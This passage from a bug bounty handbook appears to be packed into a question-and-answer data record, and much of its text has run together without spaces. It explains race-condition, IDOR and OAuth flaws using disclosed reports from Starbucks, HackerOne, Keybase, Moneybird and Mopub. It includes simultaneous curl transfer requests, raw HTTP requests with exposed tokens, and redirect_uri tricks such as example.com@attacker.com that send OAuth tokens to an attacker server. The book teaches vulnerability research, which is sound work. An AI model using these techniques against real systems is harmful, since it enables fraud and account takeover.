Starbucks’ website provides users with functionality to link gift cards to accounts to\ncheck balances, transfer money, etc. Recognizing the potential for abuse transferring\nmoney, Egor decided to test things out.\nAccording to his blog post, Starbucks attempted to pre-empt the vulnerability (I’m\nguessing)bymakingthetransferrequestsstateful,thatisthebrowserfirstmakeaPOST\nrequest to identify which account was transferring and which was receiving, saving this\ninformationtotheuser’ssession.Thesecondrequestwouldconfirmthetransactionand\ndestroy the session.\nThereasonthiswouldtheoreticallymitigatethevulnerabilityisbecausetheslowprocess\noflookinguptheuseraccountsandconfirmingtheavailablebalancesbeforetransferring\nthemoneywouldalreadybecompletedandtheresultsavedinthesessionforthesecond\nstep.\nHowever,undeterred,Egorrecognizedthattwosessionscouldbeusedtoandcomplete\nsteponewaitingforsteptwototakeplace,toactuallytransfermoney.Here’sthepseudo\ncode he shared on his post:\n1http://sakurity.com/blog/2015/05/21/starbucks.html\nRaceConditions 145\n#preparetransferdetailsinbothsessions\ncurlstarbucks/step1-H<<Cookie:session=session1>>--data<<amount=1&from=wall\\\net1&to=wallet2>>\ncurlstarbucks/step1-H<<Cookie:session=session2>>--data<<amount=1&from=wall\\\net1&to=wallet2>>\n#send$1simultaneouslyfromwallet1towallet2usingbothsessions\ncurlstarbucks/step2?confirm-H<<Cookie:session=session1>>&curlstarbucks/st\\\nep2?confirm-H<<Cookie:session2>>&\nIn this example, you’ll see the first two curl statements would get the sessions and then\nthelastwouldcallstep2.Theuseofthe&instructsbashtoexecutethecommandinthe\nbackground so you don’t wait for the first to finish before executing the second.\nAll that said, it took Egor six attempts (he almost gave up after the fifth attempt) to get\nthe result; two transfers of $5 from gift card 1 with a $5 balance resulting in $15 on the\ngift card 2 ($5 starting balance, two transfers of $5) and $5 on gift card 3.\nNow,takingitastepfurthertocreateaproofofconcept,EgorvisitedanearbyStarbucks\nand made a $16 dollar purchase using the receipt to provide to Starbucks.\nTakeaways\nRaceconditionsareaninterestingvulnerabilityvectorthatcansometimesexist\nwhere applications are dealing with some type of balance, like money, credits,\netc.Findingthevulnerabilitydoesn’talwayshappenonthefirstattemptandmay\nrequiringmakingseveralrepeatedsimultaneousrequests.Here,Egormadesix\nrequestsbeforebeingsuccessfulandthenwentandmadeapurchasetoconfirm\ntheproofofconcept.\n2. Accepting HackerOne Invites Multiple Times\nDifficulty: Low\nUrl: hackerone.com/invitations/INVITE_TOKEN\nReport Link: https://hackerone.com/reports/1193542\nDate Reported: February 28, 2016\nBounty Paid: Swag\nDescription:\nHackerOne offers a $10k bounty for any bug that might grant unauthorized access to\nconfidentialbugdescriptions.Don’tletthemightfoolyou,youneedtoproveit.Todate,\n2https://hackerone.com/reports/119354\nRaceConditions 146\nnoonehasreportedavalidbugfallingwithinthiscategory.Butthatdidn’tstopmefrom\nwanting it in February 2016.\nExploringHackerOne’sfunctionality,Irealizedthatwhenyouinvitedapersontoareport\nor team, that person received an email with a url link to join the team or report which\nonly contained a invite token. It would look like:\nhttps://hackerone.com/invitations/fb36623a821767cbf230aa6fcddcb7e7.\nHowever, the invite was not connected to email address actually invited, meaning that\nanyone with any email address could accept it (this has since been changed).\nIstartedexploringwaystoabusethisandpotentiallyjoinareportorteamIwasn’tinvited\ntoo (which didn’t work out) and in doing so, I realized that this token should only be\nacceptable once, that is, I should only be able to join the report or program with one\naccount. In my mind, I figured the process would look something like:\n1. Server receives the request and parses the token\n2. The token is looked up in the database\n3. Once found, my account is updated to add me to the team or report\n4. The token record is updated in the database so it can’t be accepted again\nI have no idea if that is the actual process but this type of work flow supports race\ncondition vulnerabilities for a couple reasons:\n1. The process of looking up a record and then having coding logic act on it creates\na delay in the process. The lookup represents our preconditions that must be\nmet for a process to be initiated. In this case, if the coding logic takes too long,\ntwo requests may be received and the database lookups may both still fulfill the\nrequiredconditions,thatis,theinvitemaynothavebeeninvalidatedinstep4yet.\n2. Updating records in the database can create the delay between precondition and\noutcome we are looking for. While inserts, or creating new records, in a database\nareallbutinstantaneous,updatingrecordsrequireslookingthroughthedatabase\ntabletofindtherecordwearelookingfor.Now,whiledatabasesareoptimizedfor\nthis type of activity, given enough records, they will begin slowing down enough\nthat attackers can take advantage of the delay to abuse race conditions.\nI figured that the process to look up, update my account and update the invite, or #1\nabove,mayexistonHackerOne,soItesteditmanually.Todoso,Icreatedasecondand\nthirdaccount(we’llcallthemUserA,BandC).AsuserA,Icreatedaprogramandinvited\nuser B. Then I logged out. I got the invite url from the email and logged in as User B in\nmycurrentbrowserandUserCinaprivatebrowser(logginginisrequiredtoacceptthe\ninvite).\nRaceConditions 147\nNext, I lined up the two browsers and acceptance buttons so they were near on top of\neach other, like so:\nHackerOneInviteRaceConditions\nThen, I just clicked both accept buttons as quickly as possible. My first attempt didn’t\nworkwhichmeantIhadtogothroughthetediousactionofremovingUserB,resending\ntheinvite,etc.Butthesecondattempt,Iwassuccessfulandhadtwousersonaprogram\nfrom one invite.\nIn reporting the issue to HackerOne, as you can read in my report itself, I explained\nI thought this was a vulnerability which could provide an attacker extra time to scrap\ninformation from whatever report / team they joined since the victim program would\nhave a head scratching moment for two random users joining their program and then\nhaving to remove two accounts. To me, every second counts in that situation.\nRaceConditions 148\nTakeaways\nFindingandexploitingthisvulnerabilitywasactuallyprettyfun,amini-competi-\ntion with myself and the HackerOne platform since I had to click the buttons\nso fast. But when trying to identify similar vulnerabilities, be on the look up\nfor situations that might fall under the steps I described above, where there’s\nadatabaselookup,codinglogicandadatabaseupdate.Thisscenariomaylend\nitselftoaraceconditionvulnerability.\nAdditionally, look for ways to automate your testing. Luckily for me, I was able\ntoachievethiswithoutmanyattemptsbutIprobablywouldhavegivenupafter\n4or5giventheneedtoremoveusersandresendinvitesforeverytest.\n3. Exceeding Keybase Invitation Limits\nDifficulty: Low\nUrl: https://keybase.io/_/api/1.0/send_invitations.json\nReport Link: https://hackerone.com/reports/1150073\nDate Reported: February 5, 2015\nBounty Paid: $350\nDescription:\nWhen hacking, look for opportunities where a site has an explicit limit to the number\nof specific actions you are permitted to perform, such as invites in this example or the\nnumberoftimesyoucanapplyadiscountcoupontoanorder,thenumberofusersyou\ncan add to a team account and so on.\nKeybase is a security app for mobile phones and computers and when they launched\ntheir site, they limited the number of people allowed to sign up by providing registered\nusers with three invites, initiated via a HTTP request to Keybase. Josip FranjkoviÄ￿\nrecognizedthatthisbehaviorcouldbevulnerabletoaraceconditionforsimilarreasons\nas described in the first example; Keybase was likely receiving the request to invite\nanother user, checking the database to see if a user had invites left, generating a token,\nsending the email and decrementing the number of invites left.\nTo test, Josip visited https://keybase.io/account/invitations, entered an email address\nandsubmittedtheinvite.UsingatoollikeBurp,helikelysentthisrequesttotheintruder\nwhich allows users to automate repetitive testing by defining an insertion point in an\nHTTP request and specifying payloads to iterate through with each request, adding the\npayload to the insertion point. In this case, he would have specified multiple email\naddresses and each request would have been sent all but simultaneously.\n3https://hackerone.com/reports/115007\nRaceConditions 149\nAs a result, Josip was able to invite 7 users, bypassing the limit of 3 invites per user.\nKeybase confirmed the faulty design when resolving the issue and explained they\naddressed the vulnerability by acquiring a lock before processing the invitation request\nand releasing it after the invite was sent.\nTakeaways\nAccepting and paying for this type of race condition, inviting more people than\nallowed to a site, depends on a program’s priorities, functionality and risk\nprofile. In this case, Keybase likely accepted this because they were attempting\nto manage the number of users registering on their site which this bypassed.\nThis isn’t the case for all bug bounty programs that include invite functionality,\nas demonstrated with the HackerOne invite example discussed previously. If\nreportingsomethingsimilar,besuretoclearlyarticulatewhyyourreportshould\nbeconsideredavulnerability.\n4. HackerOne Payments\nDifficulty: Low\nUrl: n/a\nReport Link: https://hackerone.com/reports/2204454\nDate Reported: April 12, 2017\nBounty Paid: $1000\nDescription:\nWhenlookingtoexploitraceconditions,lookforopportunitieswhereasiteisprocessing\ndata in the background, either unrelated to actions you performed or in a delayed\nresponse to your actions, such as issuing payments, sending emails or where you can\nschedule a future action.\nAroundspring2016,HackerOnemadechangestotheirpaymentsystemwhichcombined\nbounties awarded to hackers into a single payment when PayPal was the payment\nprocessor. Previously, if you were awarded three bounties in day, you received three\npayments from HackerOne. After the change, you’d receive one with the total amount.\nIn April 2017, Jigar Thakkar tested this functionality and recognized it was possible to\nexploit a race condition in the new functionality to duplicate payouts. When starting\nthe payment process, HackerOne collected the bounties per email address, combined\nthemintooneandthensenttherequesttoPayPal.Thepre-conditionhereislookingup\nthe email address. Jigar found that if two hackers had the same PayPal email address\n4https://hackerone.com/reports/220445\nRaceConditions 150\nregistered,HackerOnewouldcombinethebountiesintoasinglepaymentforthatemail\naddress.But,ifoneofthosehackerschangedtheirPayPaladdressafterthecombination\nbut before HackerOne sent the request to PayPal, the lump sum payment would go to\nthe first email address and the new email address would still be paid. Presumably this\nwas because the bounties were all marked as unpaid until the request to PayPal was\nmade.Exploitingthisbehaviorwastrickysinceyou’dhavetoknowwhentheprocessing\nwas being initiated and if you did, you’d only had a few seconds to modify the email\naddresses.\nThisexampleisnoteworthybecauseofHackerOne’suseofdelayedprocessingjobsand\ntimeofcheckversustimeofuse.Whenyouusesomewebsites,theywillupdaterecords\nbased on your interaction. For example, when you submit a report on HackerOne, an\nemail will be sent to the team you submitted to, the team’s stats will be updated, and\nso on. However, some functionality doesn’t occur immediately in response to an HTTP\nrequest, like payments.\nSince HackerOne combines bounties now, rather than send you money immediately\nwhen you’re awarded, it makes sense for HackerOne to use a background job which\nlooks up the money owed to you, combines it and requests the transfer from PayPal.\nBackground jobs are initiated by some other trigger than a user’s HTTP request and are\ncommonlyusedwhensitesbeginprocessingalotofdata.Thisisbecauseitdoesn’tmake\nsensetoinitiateallsiteactionsinresponsetoHTTPrequestsandmakeuserswaitforthe\naction completion before getting a HTTP response back from the server. So, when you\nsubmit your report, the server will send you a HTTP response and create a background\njobtoemailtheteamaboutyourreport.Sameforpayments,whenateamawardsyoua\nbounty,theywillgetareceiptforthepaymentbutsendingyouthemoneywillbeadded\nto a background job to be completed later.\nBackground jobs and data processing are important to race conditions because they\ncan present a delay between checking conditions (the time of check) and performing\nactions (the time of use). If a site only checks for conditions when adding something to\nbackgroundprocessingbutnotwhenitisactuallyused,theexploitationofthebehavior\ncanleadtoaracecondition.Inthiscase,itwasacheckforthesameemailaddresswhen\ncombining bounties without a check that the email address hadn’t changed at the time\nof pay, or use.\nRaceConditions 151\nTakeaways\nWhen using a site, if you notice it is processing data well after you’ve visited\nthesite,it’slikelyusingabackgroundjobtoprocessdata.Thisisaredflagthat\nyou should test the conditions that define the job to see if the site will act on\nthe new conditions versus the old ones. In this example, it was HackerOne’s\ncombining payments for an email address versus sending money to specific\nemail addresses. Be sure to test the behavior thoroughly since background\nprocessing can happen anywhere from very quickly to long after depending on\nhow many jobs have been queued to be completed and the site’s approach to\nprocessingdata.\nSummary\nAny time a site is performing actions dependent on some conditions being true, which\nchange as a result of the action being performed, there’s always the chance that\ndevelopers did not account for race conditions. Be on the lookout for this type of\nfunctionalityasitrelatestolimitedactionsyouarepermittedtoperformandwhenasite\nis processing actions in the background. This type of vulnerability is usually associated\nwithconditionschangingveryquickly,sometimesnearlyinstantaneously,soifyouthink\nsomething is vulnerable, it may take multiple attempts to actually exploit the behavior.\nBe persistent and include a strong rationale if there’s a chance a program may not\nconsider exploiting your discovered race condition as a serious vulnerability.\n18. Insecure Direct Object References\nDescription\nAn insecure direct object reference (IDOR) vulnerability occurs when an attacker can\naccess or modify some reference to an object, such as a file, database record, account,\netc. which should actually be inaccessible to them. For example, when viewing your\naccount on a website with private profiles, you might visit www.site.com/user=123.\nHowever,ifyoutriedwww.site.com/user=124andweregrantedaccess,thatsitewould\nbe considered vulnerable to an IDOR bug.\nIdentifying this type of vulnerability ranges from easy to hard. The most basic is similar\nto the example above where the ID provided is a simple integer, auto incremented as\nnew records (or users in the example above) are added to the site. So testing for this\nwould involve adding or subtracting 1 from the ID to check for results. If you are using\nBurp, you can automate this by sending the request to Burp Intruder, set a payload on\nthe ID and then use a numeric list with start and stop values, stepping by one.\nWhen running that type of test, look for content lengths that change signifying different\nresponses being returned. In other words, if a site isn’t vulnerable, you should consis-\ntently get some type of access denied message with the same content length.\nWhere things are more difficult is when a site tries to obscure references to their object\nreferences, using things like randomized identifiers, such universal unique identifiers\n(UUIDs). In this case, the ID might be a 36 character alpha numeric string which is\nimpossibletoguess.Inthiscase,onewaytoworkistocreatetwouserprofilesandswitch\nbetween those accounts testing objects. So, if you are trying to access user profiles with\na UUID, create your profile with User A and then with User B, try to access that profile\nsince you know the UUID.\nIf you are testing specific records, like invoice IDs, trips, etc. all identified by UUIDs,\nsimilar to the example above, try to create those records as User A and then access\nthemasUserBsinceyouknowthevalidUUIDsbetweenprofiles.Ifyou’reabletoaccess\nthe objects, that’s an issue but not overly severe since the IDs (with limited exception)\nare36characters,randomizedstrings.Thismakesthemallbutunguessable.Allisn’tlost\nthough.\nAtthispoint,thenextstepistotrytofindanareawherethatUUIDisleaked.Forexample,\non a team based site, can you invite User B to your team, and if so, does the server\nrespond with their UUID even before they have accepted? That’s one way sites leak\nUUIDs. In other situations, check the page source when visiting a profile. Sometimes\nInsecureDirectObjectReferences 153\nsites will include a JSON blob for the user which also includes all of the records created\nby them thereby leaking sensitive UUIDs.\nAt this point, even if you can’t find a leak, some sites will reward the vulnerability if the\ninformation is sensitive. It’s really up to you to determine the impact and explain to the\ncompany why you believe this issue should be addressed.\nExamples\n1. Binary.com Privilege Escalation\nDifficulty: Low\nUrl: binary.com\nReport Link: https://hackerone.com/reports/982471\nDate Reported: November 14, 2015\nBounty Paid: $300\nDescription:\nThis is really a straight forward vulnerability which doesn’t need much explanation.\nIn essence, in this situation, a user was able to login to any account and view sensitive\ninformation, or perform actions, on behalf of the hacked user account and all that was\nrequired was knowing a user’s account ID.\nBefore the hack, if you logged into Binary.com/cashier and inspected the page HTML,\nyou’d notice an <iframe> tag which included a PIN parameter. That parameter was\nactually your account ID.\nNext, if you edited the HTML and inserted another PIN, the site would automatically\nperform an action on the new account without validating the password or any other\ncredentials. In other words, the site would treat you as the owner of the account you\njust provided.\nAgain, all that was required was knowing someone’s account number. You could even\nchange the event occurring in the iframe to PAYOUT to invoke a payment action to\nanother account. However, Binary.com indicates that all withdraws require manual\nhuman review but that doesn’t necessarily mean it would have been caught￿\n1https://hackerone.com/reports/98247\nInsecureDirectObjectReferences 154\nTakeaways\nIf you’re looking for authentication based vulnerabilities, be on the lookout for\nwherecredentialsarebeingpassedtoasite.Whilethisvulnerabilitywascaught\nbylookingatthepagesourcecode,youalsocouldhavenoticedtheinformation\nbeingpassedwhenusingaProxyinterceptor.\nIfyoudofindsometypeofcredentialsbeingpassed,takenotewhentheydonot\nlookencryptedandtrytoplaywiththem.Inthiscase,thepinwasjustCRXXXXXX\nwhilethepasswordwas0e552ae717a1d08cb134f132￿clearlythePINwasnot\nencryptedwhilethepasswordwas.Unencryptedvaluesrepresentaniceareato\nstartplayingwith.\n2. Moneybird App Creation\nDifficulty: Medium\nUrl: https://moneybird.com/user/applications\nReport Link: https://hackerone.com/reports/1359892\nDate Reported: May 3, 2016\nBounty Paid: $100\nDescription:\nIn May 2016, I began testing Moneybird for vulnerabilities. In doing so, I started testing\ntheir user account permissions, creating a businesses with Account A and then inviting\na second user, Account B to join the account with limited permissions. If you aren’t\nfamiliarwiththeirplatform,addeduserscanbelimitedtospecificrolesandpermissions,\nincludingjustinvoices,estimates,banking,etc.Aspartofthis,userswithfullpermissions\ncan also create apps and enable API access, with each app having it’s own OAuth\npermissions (or scopes in OAuth lingo). Submitting the form to create an app with full\npermissions looked like:\n2https://hackerone.com/reports/135989\nInsecureDirectObjectReferences 155\nPOST/user/applicationsHTTP/1.1\nHost:moneybird.com\nUser-Agent:Mozilla/5.0(WindowsNT6.1;rv:45.0)Gecko/20100101Firefox/45.0\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:en-US,en;q=0.5\nAccept-Encoding:gzip,deflate,br\nDNT:1\nReferer:https://moneybird.com/user/applications/new\nCookie:_moneybird_session=XXXXXXXXXXXXXXX;trusted_computer=\nConnection:close\nContent-Type:application/x-www-form-urlencoded\nContent-Length:397\nutf8=%E2%9C%93&authenticity_token=REDACTED&doorkeeper_application%5Bname%5D=TWDA\\\npp&token_type=access_token&administration_id=ABCDEFGHIJKLMNOP&scopes%5B%5D=sales\\\n_invoices&scopes%5B%5D=documents&scopes%5B%5D=estimates&scopes%5B%5D=bank&scopes\\\n%5B%5D=settings&doorkeeper_application%5Bredirect_uri%5D=&commit=Save\nAs you can see, the call includes an administration_id, which turns out to be the\naccount id for the businesses users are added to. Even more interesting was the fact\nthat despite the account number being a 18 digit number (at the time of my testing),\nit was immediately disclosed to the added user to the account after they logged in via\nthe URL. So, when User B logged in, they (or rather I) were redirected to Account A at\nhttps://moneybird.com/ABCDEFGHIJKLMNOP (based on our example id above) with\nABCDEFGHIJKLMOP being the administration_id.\nWith these two pieces of information, it was only natural to use my invitee user, User\nB, to try and create an application for User A’s business, despite not being given explicit\npermission to do so. As a result, with User B, I created a second business which User\nB owned and was in total control of (i.e., User B had full permissions on Account B and\ncould create apps for it, but was not supposed to have permission to create apps for\nAccountA).IwenttothesettingspageforAccountBandaddedanapp,interceptingthe\nPOSTcalltoreplacetheadministration_idwiththatfromAccountA’sURLanditworked.\nAs User B, I had an app with full permissions to Account A despite my user only having\nlimited permissions to invoicing.\nTurns out, an attacker could use this vulnerability to bypass the platform permissions\nand create an app with full permissions provided they were added to a business or\ncompromised a user account, regardless of the permissions for that user account.\nDespitehavingjustgonelivenotlongbefore,andnodoubtbeinginundatedwithreports,\nMoneybirdhadtheissueresolvedandpaidwithinthemonth.Definitelyagreatteamto\nwork with, one I recommend.\nInsecureDirectObjectReferences 156\nTakeaways\nTesting for IDORs requires keen observation as well as skill. When reviewing\nHTTP requests for vulnerabilities, be on the lookout for account identifiers like\nthe administration_id in the above. While the field name, administration_id\nis a little misleading compared to it being called account_id, being a plain\nintegerwasaredflagthatIshouldcheckitout.Additionally,giventhelengthof\nthe parameter, it would have been difficult to exploit the vulnerability without\nmaking a bunch of network noise, having to repeat requests searching for the\nrightid.Ifyoufindsimilarvulnerabilities,toimproveyourreport,alwaysbeon\nthelookoutforHTTPresponses,urls,etc.thatdiscloseids.Luckilyforme,theid\nIneededwasincludedintheaccountURL.\n3. Twitter Mopub API Token Stealing\nDifficulty: Medium\nUrl: https://mopub.com/api/v3/organizations/ID/mopub/activate\nReport Link: https://hackerone.com/reports/955523\nDate Reported: October 24, 2015\nBounty Paid: $5,040\nDescription:\nIn October 2015, Akhil Reni (https://hackerone.com/wesecureapp) reported that Twit-\nter’s Mopub application (a Twitter acquisition from 2013) was vulnerable to an IDOR\nbugwhichallowedattackerstostealAPIkeysandultimatelytakeoveravictim’saccount.\nInterestingly though, the account takeover information wasn’t provided with the initial\nreport-itwasprovided19daysafterviacomment,luckilybeforeTwitterpaidabounty.\nAccording to his report, this vulnerability was caused by a lack of permission validation\non the POST call to Mopub’s activate endpoint. Here’s what it looked like:\nPOST/api/v3/organizations/5460d2394b793294df01104a/mopub/activateHTTP/1.1\nHost:fabric.io\nUser-Agent:Mozilla/5.0(WindowsNT6.3;WOW64;rv:41.0)Gecko/20100101Firefox/\\\n41.0\nAccept:*/*\nAccept-Language:en-US,en;q=0.5\nAccept-Encoding:gzip,deflate\nX-CSRF-Token:0jGxOZOgvkmucYubALnlQyoIlsSUBJ1VQxjw0qjp73A=\nContent-Type:application/x-www-form-urlencoded;charset=UTF-8\n3https://hackerone.com/reports/95552\nInsecureDirectObjectReferences 157\nX-CRASHLYTICS-DEVELOPER-TOKEN:0bb5ea45eb53fa71fa5758290be5a7d5bb867e77\nX-Requested-With:XMLHttpRequest\nReferer:https://fabric.io/img-srcx-onerrorprompt15/android/apps/app.myapplicati\\\non/mopub\nContent-Length:235\nCookie:<redacted>\nConnection:keep-alive\nPragma:no-cache\nCache-Control:no-cache\ncompany_name=dragoncompany&address1=123street&address2=123&city=hollywood&state\\\n=california&zip_code=90210&country_code=US&link=false\nWhich resulted in the following response:\n{\"mopub_identity\":{\"id\":\"5496c76e8b15dabe9c0006d7\",\"confirmed\":true,\"primary\":fa\\\nlse,\"service\":\"mopub\",\"token\":\"35592\"},\"organization\":{\"id\":\"5460d2394b793294df0\\\n1104a\",\"name\":\"test\",\"alias\":\"test2\",\"api_key\":\"8590313c7382375063c2fe279a4487a9\\\n8387767a\",\"enrollments\":{\"beta_distribution\":\"true\"},\"accounts_count\":3,\"apps_co\\\nunts\":{\"android\":2},\"sdk_organization\":true,\"build_secret\":\"5ef0323f62d71c475611\\\na635ea09a3132f037557d801503573b643ef8ad82054\",\"mopub_id\":\"33525\"}}\nIn these calls, you’ll see that the organization id was included as part of the URL, similar\nto example 2 above. In the response, Mopub confirms the organization id and also\nprovidestheapi_key.Again,similartotheexampleabove,whiletheorganizationidisan\nunguessable string, it was being leaked on the platform, details of which unfortunately\nweren’t shared in this disclosure.\nNow, as mentioned, after the issue was resolved, Akhil flagged for Twitter that this vul-\nnerabilitycouldhavebeenabusedtocompletelytakeoverthevictim’saccount.Todoso,\ntheattackerwouldhavetotakethestolenAPIkeyandsubstituteitforthebuildsecretin\ntheURLhttps://app.mopub.com/complete/htsdk/?code=BUILDSECRET&next=%2d.\nAfter doing so, the attacker would have access to the victim’s Mopub account and all\napps/organizations from Twitter’s mobile development platform, Fabric.\nInsecureDirectObjectReferences 158\nTakeaways\nWhile similar to the Moneybird example above, in that both required abusing\nleaked organization ids to elevate privileges, this example is great because it\ndemonstrates the severity of being able to attack users remotely, with zero\ninteraction on their behalf and the need to demonstrate a full exploit. Initially,\nAkhil did not include or demonstrate the full account takeover and based on\nTwitter’s response to his mentioning it (i.e., asking for details and full steps to\ndo so), they may not have considered that impact when initially resolving the\nvulnerability.So,whenyoureport,makesuretofullyconsideranddetailthefull\nimpactofthevulnerabilityyouarereporting,includingstepstoreproduceit.\nSummary\nIDOR vulnerabilities occurs when an attacker can access or modify some reference\nto an object which should actually be inaccessible to that attacker. They are a great\nvulnerabilitytotestforandfindbecausetheircomplexityrangesfromsimple,exploiting\nsimple integers by adding and subtracting, to more complex where UUIDs or random\nidentifiers are used. In the event a site is using UUIDs or random identifiers, all is not\nlost. It may be possible to guess those identifiers or find places where the site is leaking\ntheUUIDs.ThiscanincludeJSONresponses,HTMLcontentresponsesandURLsasafew\nexamples.\nWhen reporting, be sure to consider how an attacker can abuse the vulnerability. For\nexample, while my Moneybird example required a user being added to an account,\nan attacker could exploit the IDOR to completely bypass the platform permissions by\ncompromising any user on the account."
  },
  {
    "input": "What are the key steps and potential vulnerabilities in the OAuth 2.0 authorization process, and how can attackers exploit misconfigurations in the redirect_uri or response_type to steal access tokens?",
    "summary": "OAuth is an open protocol that allows users to grant access to their information on one site to another without sharing their password. It uses a process involving a Resource Owner, Client, and Resource Server, with scopes controlling access. OAuth 2.0 is commonly used and can be exploited through misconfigurations, such as open redirects or CSRF vulnerabilities, which allow attackers to steal tokens. Application logic vulnerabilities involve exploiting coding decisions or bugs in how a web application handles scenarios, such as the GitHub mass assignment vulnerability or the HackerOne Hacktivity voting exploit. These vulnerabilities often require creative thinking and testing beyond traditional input methods.",
    "output": "19. OAuth\nDescription\nAccording to the OAuth site, it is an open protocol to allow secure authorization in\na simple and standard method from web, mobile and desktop applications. In other\nwords, OAuth is a form of user authentication which allows users to permit websites or\napplications to access their information from another site without disclosing or sharing\ntheir password. This is the underlying process which allows you to login to a site using\nFacebook, Twitter, LinkedIn, etc. There are two versions of OAuth, 1.0 and 2.0. They are\nnot compatible with each other and for the purposes of this Chapter, we’ll be working\nwith 2.0.\nSince the process can be pretty confusing and the implementation has a lot of potential\nfor mistakes, I’ve included a great image from Philippe Harewood’s1 blog depicting the\ngeneral process:\n1https://www.philippeharewood.com\nOAuth 160\nPhilippeHarewood-FacebookOAuthProcess\nLet’s break this down. To begin, you’ll notice there three titles across the top: User’s\nBrowser, Your App’s Server-side Code and Facebook API. In OAuth terms, these are\nactually the Resource Owner, Client and Resource Server. The key takeaway is that\nyour browser will be performing and handling a number of HTTP requests to facilitate\nyou, as the Resource Owner, instructing the Resource Server to allow the Client\naccess to your personal information, as defined by the scopes requested. Scopes are\nlike permissions and they control access to specific pieces of information. For example,\nFacebook scopes include email, public_profile, user_friends, etc. So, if you only granted\ntheemailscope,asitecouldonlyaccessthatFacebookinformationandnotyourfriends,\nprofile, etc.\nThat said, let’s walk through the steps.\nStep 1\nYou can see that the OAuth process all begins the User’s browser and a user clicking\n“LoginwithFacebook”.ClickingthisresultsinaGETrequesttothesiteyouare.Thepath\nusually looks something like www.example.com/oauth/facebook.\nOAuth 161\nStep 2\nThesitewillresponsewitha302redirectwhichinstructsyourbrowsertoperformaGET\nrequest to the URL defined in the location header. The URL will look something like:\nhttps://www.facebook.com/v2.0/dialog/oauth?client_id=123\n&redirect_uri=https%3A%2F%2Fwww.example.com%2Foauth%2Fcallback\n&response_type=code&scope=email&state=XYZ\nThereareacoupleofimportantpiecestothisURL.First,theclient_ididentifieswhichsite\nyouarecomingfrom.Theredirect_uritellsFacebookwheretosendyoubacktoafteryou\nhavepermittedthesite(theclient)toaccesstheinformationdefinedbythescope,also\nincluded in the URL.\nNext, the response_type tells Facebook what to return, this can be a token or a code.\nThedifferencebetweenthesetwoisimportant,acodeisusedbythepermittedsite(the\nclient) to call back to the Resource Server, or Facebook in our example, again to get\na token. On the other hand, requesting and receiving a token in this first stop would\nprovideimmediateaccesstotheresourceserver toqueryaccountinformationaslong\nas that token was valid.\nLastly, the state value acts as a type of CSRF protection. The requesting site (the client)\nshould include this in their original call to the resource server and it should return the\nvalue to ensure that a) the original request was invoked by the site and b) the response\nhas not be tampered with.\nStep 3\nNext, if a user accepts the OAuth dialog pop up and grants the client permissions to\ntheir information on the resource server, or Facebook in our example, it will respond\nto the browser with a 302 redirect back to the site (client), defined by the redirect_uri\nand include a code or token, depending on the response_type (it is usually code) in the\ninitial URL.\nStep 4\nThe browser will make a GET request to the site (client), including the code and state\nvalues provided by the resource server in the URL.\nStep 5\nThe site (client) should validate the state value to ensure the process wasn’t tampered\nwith and use the code along with their client_secret (which only they know) to make a\nGET request to the resource server, or Facebook here, for a token.\nOAuth 162\nStep 6\nThe resource server, or Facebook in this example, responds to the site (client) with a\ntokenwhichpermitsthesite(client)tomakeAPIcallstoFacebookandaccessthescopes\nwhich you allowed in Step 3.\nNow, with that whole process in mind, one thing to note is, after you have authorized\nthe site (client) to access the resource server, Facebook in this example, if you visit\nthe URL from Step 2 again, the rest of the process will be performed completely in the\nbackground, with no required user interaction.\nSo, as you may have guessed, one potential vulnerability to look for with OAuth is the\nability to steal tokens which the resource server returns. Doing so would allow an\nattacker to access the resource server on behalf of the victim, accessing whatever was\npermittedviathescopesintheStep3authorization.Basedonmyresearch,thistypically\nisaresultofbeingabletomanipulatetheredirect_uriandrequestingatokeninsteadof\na code.\nSo,thefirststeptotestforthiscomesinStep2.Whenyougetredirectedtotheresource\nserver, modify the response_type and see if the resource server will return a token. If\nit does, modify the redirect_uri to confirm how the site or app was configured. Here,\nsome OAuth resource servers may be misconfigured themselves and permit URLs like\nwww.example.ca,www.example.com@attacker.com,etc.Inthefirstexample,adding.ca\nactuallychangesthedomainofthesite.Soifyoucandosomethingsimilarandpurchase\nthe domain, tokens would be sent to your server. In the second example, adding @\nchanges the URL again, treating the first half as the user name and password to send\nto attacker.com.\nEach of these two examples provides the best possible scenario for you as a hacker\nif a user has already granted permission to the site (client). By revisiting the now\nmalicious URL with a modified response_type and redirect_uri, the resource server\nwould recognize the user has already given permission and would return the token\nto your server automatically without any interaction from them. For example, via a\nmalicious <img> with the src attribute pointing to the malicious URL.\nNow,assumingyoucan’tredirectdirectlytoyourserver,youcanstillseeiftheresource\nserver will accept different sub domains, like test.example.com or different paths, like\nwww.example.com/attacker-controlled. If the redirect_uri configuration isn’t strict, this\ncould result in the resource server sending the token to a URL you control. However,\nyou would need to combine with this another vulnerability to successfully steal a token.\nThree ways of doing this are an open redirect, requesting a remote image or a XSS.\nWith regards to the open redirect, if you’re able to control the path and/or sub domain\nwhich being redirected to, an open redirect will leak the token from the URL in the\nreferrer header which is sent to your server. In other words, an open redirect will allow\nyou to send a user to your malicious site and in doing so, the request to your server will\nOAuth 163\ninclude the URL the victim came from. Since the resource server is sending the victim\nto the open redirect and the token is included in that URL, the token will be included in\nthe referrer header you receive.\nWith regards to a remote image, it is a similar process as described above except, when\ntheresourceserverredirectstoapagewhichincludesaremoteimagefromyourserver.\nWhenthevictim’sbrowsermakestherequestfortheimage,thereferrerheaderforthat\nrequestwillincludetheURL.Andjustlikeabove,sincetheURLincludesthetoken,itwill\nbe included in the request to your server.\nLastly, with regards to the XSS, if you are able to find a stored XSS on any sub domain /\npath you are redirect to or a reflected XSS as part of the redirect_uri, an attacker could\nexploitthattouseamaliciousscriptwhichtakesthetokenfromtheURLandsendsitto\ntheir server.\nWithallofthisinmind,theseareonlysomeofthewaysthatOAuthcanbeabused.There\nare plenty of others as you’ll learn from the examples.\nExamples\n1. Swiping Facebook Official Access Tokens\nDifficulty: High\nUrl: facebook.com\nReport Link: Philippe Harewood - Swiping Facebook Official Access Tokens2\nDate Reported: February 29, 2016\nBounty Paid: Undisclosed\nDescription:\nIn his blog post detailing this vulnerability, Philippe starts by describing how he wanted\nto try and capture Facebook tokens. However, he wasn’t able to find a way to break\ntheir OAuth process to send him tokens. Instead, he had the ingenious idea to look for\na vulnerable Facebook application which he could take over. Very similar to the idea of\na sub domain takeover.\nAsitturnsout,everyFacebookuserhasapplicationsauthorizedbytheiraccountbutthat\ntheymaynotexplicitlyuse.Accordingtohiswriteup,anexamplewouldbe“ContentTab\nof a Page on www” which loads some API calls on 